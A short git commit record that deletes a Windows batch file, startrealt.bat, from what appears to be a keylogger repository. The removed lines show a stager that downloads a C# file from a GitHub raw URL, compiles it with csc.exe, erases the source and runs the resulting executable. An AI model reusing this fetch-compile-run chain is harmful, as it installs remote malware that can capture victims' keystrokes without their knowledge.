bc93c01cfb3529616c9ca9766fedd513d815d927
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-09-07 15:25:58 -0300

    Delete startrealt.bat

--- startrealt.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exploitrealtime.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploitrealtime.cs
-erase exploitrealtime.cs & exploitrealtime.exe
